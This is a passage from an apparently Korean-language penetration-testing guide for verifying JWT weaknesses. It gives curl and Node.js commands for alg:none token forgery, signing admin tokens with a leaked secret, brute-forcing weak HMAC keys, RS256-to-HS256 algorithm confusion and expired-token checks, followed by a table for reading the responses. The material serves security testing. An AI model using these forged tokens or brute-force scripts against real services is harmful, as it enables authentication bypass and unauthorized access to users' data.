### Phase 2: 동적 테스트 (검증)


**Algorithm None 테스트:**
1. 유효한 JWT의 헤더를 `{"alg":"none","typ":"JWT"}`으로 변경
2. 페이로드를 원하는 대로 변조 (예: `sub`를 다른 사용자로 변경)
3. 서명 부분을 빈 문자열로 설정 (`header.payload.`)
4. 변조된 토큰으로 보호된 API 호출

```
# JWT 구성: base64url(header).base64url(payload).
# 헤더: {"alg":"none","typ":"JWT"}
# 페이로드: {"sub":"admin","iat":1234567890}
curl "https://target.com/api/protected" \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTIzNDU2Nzg5MH0." -v
```

**약한 시크릿 키 테스트:**
```
# 소스코드에서 발견한 키로 토큰 생성 (node 사용)
node -e "
const jwt = require('jsonwebtoken');
// Phase 1에서 발견한 키
const secret = 'HARDCODED_SECRET_FROM_SOURCE';
const token = jwt.sign({sub: 'admin', role: 'admin'}, secret);
console.log(token);
"

# 생성한 토큰으로 API 호출
curl -v "https://target.com/api/admin/users" \
  -H "Authorization: Bearer GENERATED_TOKEN"
```

약한 키 브루트포스 (jsonwebtoken 라이브러리 없이):
```
# 일반적인 약한 키 목록으로 시도
node -e "
const crypto = require('crypto');
const weakKeys = ['secret','password','123456','key','jwt_secret','changeme'];
const token = 'CAPTURED_JWT_TOKEN';
const [header, payload, signature] = token.split('.');
for (const key of weakKeys) {
  const expected = crypto.createHmac('sha256', key).update(header+'.'+payload).digest('base64url');
  if (expected === signature) { console.log('KEY FOUND:', key); break; }
}
"
```

**Algorithm Confusion (RS256→HS256) 테스트:**
```
# 서버가 RS256 사용 시, 공개키를 HS256 시크릿으로 사용하는 공격
# 1. 서버의 공개키(JWKS) 획득
curl -s "https://target.com/.well-known/jwks.json"

# 2. 공개키를 PEM으로 변환 후 HS256 시크릿으로 토큰 서명
node -e "
const jwt = require('jsonwebtoken');
const publicKey = require('fs').readFileSync('public_key.pem');
const token = jwt.sign({sub:'admin'}, publicKey, {algorithm:'HS256'});
console.log(token);
"

# 3. 변조 토큰으로 API 호출
curl -v "https://target.com/api/protected" \
  -H "Authorization: Bearer CONFUSED_TOKEN"
```

**만료 토큰 테스트:**
```
# 만료된 토큰으로 API 호출 (exp 검증 누락 확인)
curl -v "https://target.com/api/protected" \
  -H "Authorization: Bearer EXPIRED_JWT_TOKEN"
```

**서명 제거 테스트 (None 변형):**
```
# 대소문자 변형: None, NONE, nOnE
node -e "
const header = Buffer.from(JSON.stringify({alg:'None',typ:'JWT'})).toString('base64url');
const payload = Buffer.from(JSON.stringify({sub:'admin'})).toString('base64url');
console.log(header + '.' + payload + '.');
"
```

**응답 분석 기준:**

| 응답 유형 | 판단 |
|-----------|------|
| 200 OK + 보호된 리소스 반환 (변조 토큰) | 확인됨 |
| 200 OK + 다른 사용자의 데이터 반환 | 확인됨 |
| 만료 토큰으로 200 OK | 확인됨 (exp 검증 누락) |
| 401 Unauthorized + `invalid signature` | 안전 (서명 검증 동작) |
| 401 + `token expired` | 안전 (만료 검증 동작) |
| 401 + `algorithm not allowed` | 안전 (알고리즘 화이트리스트 동작) |
| 403 Forbidden | 인가 체크 동작 여부에 따라 판단 |

**검증 기준:**
- **확인됨**: 동적 테스트로 변조된 토큰이 서버에서 수락되어 인증/인가가 우회된 것을 직접 확인함
